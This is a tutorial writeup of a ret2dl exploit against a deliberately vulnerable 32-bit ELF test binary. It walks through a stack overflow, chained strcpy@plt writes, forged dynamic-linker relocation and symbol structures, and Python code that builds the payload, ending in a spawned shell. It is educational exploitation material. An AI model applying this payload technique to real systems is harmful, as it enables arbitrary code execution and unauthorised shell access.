# ret2dl

This is an ad-hoc exploitation of an example vulnerable x86 ELF32
using the ret2dl technique.


## Setup

Our binary is `test/test`, compiled with 

```
gcc -o test -m32 -fomit-frame-pointer -fno-stack-protector -fno-pie test.c
```

Full ASLR and DEP are enabled, as well as partial RELRO.  In
particular, the ret2plt technique will let us call arbitrary functions
from the plt.  The binary has very little code, but does call strcpy,
so we can return to that at least.  However, there is very little
source material for complex ROP chains, and there is no interactivity,
so we cannot leverage any info leaks.


## Idea

The basic idea is that, if we knew the address of the `system`
function within the libc, we could return there.  There is no usable
infoleak to give us a libc base address that we can use to return
directly to `system`.

However, we notice that the first time strcpy is called in the binary,
the function `_dl_runtime_resolve` is called to figure out, apparently
based on the string name of the "strcpy" function, the address of
`strcpy` and to store that address in the approparite GOT entry.

The basic idea is the following: 

1. Get control over execution as usual

2. Prepare structures in memory as though we are about to resolve the
   address of `system` from the "system".

3. Return to `_dl_rumtime_resolve` directly, with pointers to these
   structures as arguments.

4. Return to `system`, now populated into the GOT, with "/bin/sh" as
   the argument.


## Vulnerability

This particular example involves a very simple stack overflow that gives
control over EIP with a payload like:

```
padding:20
eip:4
```


## Arbitrary writes

Further, `strcpy` is in the plt, so we have a free "write what where"
primitive via the following: 

```
padding:20
strcpy@plt:4
padding:4
dst:4
src:4
```

The 4 bytes of padding after the `strcpy` address are to simulate the
return address that would be present after `call strcpy@plt` normally.
What this means is we can chain strcpy calls by placing instead the
address of a poppopret gadget there and following this with another
strcpy ret2plt: 

```
padding:20
strcpy@plt:4
poppopret:4
dst0:4
src0:4
strcpy@plt:4
poppopret:4
dst1:4
src1:4
...
```

Clearly we can repeat this as much as we like, so we can write any
number of arbitrary bytes anywhere we like, as long as those bytes are
present at an address we know.  Ignoring for the moment the question
of where those bytes come from, this lets us write arbitrary bytes.
The `strcpy` function prepares the 4-dword structure for a single
strcpy call, and `write_bytes` chains these to write an entire list of
bytes:

```
STRCPY_PLT = 0x08048370
POP2_RET = 0x080485fa
    
def le(x):
    return x.to_bytes(WORD_SIZE, byteorder='little')

def strcpy(dst, src):
    return le(STRCPY_PLT) + le(POP2_RET) + le(dst) + le(src)
	
def write_bytes(dst, content):
    ans = bytes()
    for b in content:
        ans += strcpy(dst,byte_addr(b))
        dst += 1
    return ans
```

Note the `byte_addr` function whose job is to find the byte in memory.
Because the binary is compiled without PIE, we'll look in the mapped
portions of the ELF file itself (.text, .rodata, and similar) to
locate these bytes.  We prepare the `byte_addr` function to return the
address of a specified byte in memory:

```
ELF_BASE = 0x08048000
ELF_SIZE = 0x1000

with open(sys.argv[2],"rb") as f:
    elf_data = f.read(ELF_SIZE)

def byte_addr(b):
    return ELF_BASE+elf_data.find(bytes([b]))
```

The two remaining questions are: where do we write our data, and what
do we write?

The "where" is easy: the .bss section is mapped to
0x0804a000-0x0804b000 and is writeable, so we can place data here.
The "what" is more tricky and requires understanding the dynamic
linker symbol resolution process to some extent.

## Dynamic linker symbol resolution

The dynamic linker references structures compiled into the ELF.  We
can see the relevant addresses using `readelf -d test/test`.  Of
interest are: 

* Relocation entries of type Elf32_Rel, stored at address `JMPREL`.

* Symbol entries of type Elf32_Sym, stored at address `SYMTAB`.

* ASCIIZ Strings stored at address `STRTAB`.

where these structures come from elf.h: 

```
typedef uint32_t Elf32_Word;
typedef uint32_t Elf32_Addr;

typedef struct
{
  Elf32_Addr	r_offset;		/* Address */
  Elf32_Word	r_info;			/* Relocation type and symbol index */
} Elf32_Rel;


typedef struct
{
  Elf32_Word	st_name;		/* Symbol name (string tbl index) */
  Elf32_Addr	st_value;		/* Symbol value */
  Elf32_Word	st_size;		/* Symbol size */
  unsigned char	st_info;		/* Symbol type and binding */
  unsigned char	st_other;		/* Symbol visibility */
  Elf32_Section	st_shndx;		/* Section index */
} Elf32_Sym;
```

At a high level (and skipping a couple details), the symbol resolution
process takes `reloc_idx` as a parameter, and consists of the
following steps:

* Get the `Elf32_Rel` relocation structure as `reloc = JMPREL +
  reloc_idx`.  
  
  * `r_offset` will be the address where the resolved address will be
    written
	
  * `r_info` the three high-order bytes are the symbol index, and the
    last is the relocation type (which, from stepping through the
    code, seems to need to be 7)
  
* Get the `Elf32_Sym` symbol structure as `sym_addr = SYMTAB + 16*(r_info >> 8)`
  
  * `st_name` is the offset of the string name in the strtab.  Thus
    the name will be sought at `STRTAB + st_name`.
	
  * `st_other` seems to need to be 0, after watching its interaction
    with the code.
  
This means we provide one input: `reloc_idx`, and computed from this,
the following addresses are of interest:

```
JMPREL + reloc_idx:            got_addess
JMPREL + reloc_idx + 4:        (symbol_idx << 8) + 0x7
SYMTAB + 16*symbol_idx:        name_offset
SYMTAB + 16*symbol_idx + 13:   0
STRTAB + name_offset:          "system\x00"
```

It turns out that there is also a "symbol versions table" starting at
address `VERSYM`, and so the address `VERSYM+2*symbol_idx` must also
be 0.  However, we shall not need to write this but can arrange for
this address to land within an already-mapped region of memory that
contains a zero value.

Another condition we've elided is that there is a second argument to
`dl_runtime_resolve`: `link_map`.  This simply needs to be zero, and
has no other constraints on it. 

The only remaining thing is that we also need the argument for
`system`, namely `"/bin/sh\x00"` to go somewhere.  So we pick an
address and write this as well.  

However, there are only so many writeable addresses and so many
pre-mapped addresses that are zero.  Specifically: 

```
writeable:   0x0804a000 -- 0x0804b000
zero:        0x080487b0 -- 0x08048f0c
```

So we need to ensure the following constraints can be saitsfied: 

```
JMPREL + reloc_idx is writeable
SYMTAB + 16*symbol_idx is writeable
VERSYM + 2*symbol_idx is zero
STRTAB + name_offset is writeable
link_map is zero
arg_addr is writeable
name_addr is writeable
```

This gives us a set of inequalities that we can check for our
particular binary do have a solution: 

```
$ python ret2dl.py check
0x1d08 < reloc_idx < 0x2d08
0x1e3 < symbol_idx < 0x2e3
0x27a < symbol_idx < 0x628
0x80487b0 < link_map < 0x8048f0c
0x804a000 < name_addr < 0x804b000
0x804a000 < arg_addr < 0x804b000
0x1da4 < name_offset < 0x2da4
```

The only of these that even might go wrong is `symbol_idx`, since it
has to satisfy two inequalities, but these turn out to have a
solution, so we're OK.

## Exploitation

So we pick arbitrary values for each of these variables satisfying the
inequalities above and we're set

```
# Values from the binary: 

JMPREL=0x80482f8
SYMTAB=0x80481cc
VERSYM=0x80482bc
STRTAB=0x804825c

# Picking values that satisfy the inequalities: 

reloc_idx=0x2020
symbol_idx=0x2d0
link_map=0x80487f0
name_offset=0x1ecc
arg_addr = 0x804afc0
got_addr = 0x804a014

# Computing addresses to write to

reloc=JMPREL + reloc_idx
sym_addr=SYMTAB + 16*symbol_idx
name_addr=STRTAB + name_offset
reloc_val = (symbol_idx << 8) + 0x07

# Preparing all the writes we need to do

writes = {
    sym_addr:     name_offset.to_bytes(4,byteorder='little'),       # st_name = name offset
    sym_addr+0xd: int(0x0).to_bytes(1,byteorder='little'),  # st_other = 0x0
    reloc:        got_addr.to_bytes(4,byteorder='little'),  # r_address = GOT address to write
    reloc+4:      reloc_val.to_bytes(4,byteorder='little'), # r_info = symbol_offset:3, 0x7:1 
    name_addr:    bytes("system\x00",'ascii'),
    arg_addr:     bytes("/bin/sh\x00",'ascii')
}

# Writing the payload

payload = pad(20)
for x in sorted(writes.keys()):
    payload += write_bytes(x,writes[x])
```

Finally, this will set up to write the address of `system` to the GOT
entry for `puts`.  So once all these have taken place, we can return
to the call to `_dl_runtime_resolve` from the PLT entry for `puts`
with arguments `reloc_idx` and `link_map`.  Once this completes, it
will continue directly to `system`, so we also need to provide the
argument to that: 

```
payload += le(PUTS_PLT)
payload += le(reloc_idx)
payload += le(link_map) 
payload += le(arg_addr)
```

We write this to a file: 

```
with open("payload","wb") as f:
    f.write(payload)
```

And run the program with our payload: 

```
$ python ret2dl.py write
$ ./test/test payload 
sh-4.4$ 
```
